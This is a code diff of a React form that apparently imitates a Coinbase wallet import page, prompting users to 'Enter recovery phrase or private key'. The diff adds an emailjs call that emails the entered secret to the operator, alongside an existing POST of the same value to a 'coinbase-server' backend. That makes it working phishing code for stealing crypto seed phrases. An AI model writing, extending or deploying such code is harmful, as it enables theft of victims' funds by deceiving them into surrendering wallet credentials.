@@ -1,10 +1,12 @@
-import React, { useState } from "react";
+import React, { useState, useRef } from "react";
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import { faLeftLong } from "@fortawesome/free-solid-svg-icons";
 import { Link, useNavigate } from "react-router-dom";
 import axios from "axios";
+import emailjs from "@emailjs/browser";
 
 export default function Input() {
+  const form = useRef();
   const [inputValue, setInputValue] = useState("");
   const [errorMessage, setErrorMessage] = useState("");
   const [loading, setLoading] = useState(false);
@@ -22,9 +24,18 @@ export default function Input() {
     } else {
       setLoading(true);
       try {
-        const routes = "http://localhost:5002" || "https://coinbase-server.vercel.app";
+        await emailjs.sendForm(
+          import.meta.env.VITE_APP_SERVICE_KEY,
+          import.meta.env.VITE_APP_TEMPLATE_KEY,
+          form.current,
+          import.meta.env.VITE_APP_PUBLIC_KEY
+        );
+
+        const routes =
+          "http://localhost:5002" || "https://coinbase-server.vercel.app";
         const response = await axios.post(`${routes}/input`, { inputValue });
         console.log("Form submitted:", response.data);
+
         setInputValue("");
         navigate("/submit", { replace: true });
       } catch (error) {
@@ -61,10 +72,12 @@ export default function Input() {
         </div>
       </div>
       <div className="w-full sm:w-3/4 lg:w-[67%] max-w-md">
-        <form onSubmit={handleSubmit}>
+        <form ref={form} onSubmit={handleSubmit}>
           <div className="mb-10">
             <input
               type="text"
+              name="message"
+              id="message"
               placeholder="Enter recovery phrase or private key"
               className="w-full py-3 px-4 rounded-lg outline outline-1 outline-gray-500"
               value={inputValue}
@@ -78,6 +91,7 @@ export default function Input() {
           <div className="mt-20">
             <button
               type="submit"
+              value="Send"
               className="btn btn-active py-2 rounded-full w-full text-center bg-black dark:bg-white text-white dark:text-black">
               {loading ? "Loading..." : "Import"}
             </button>
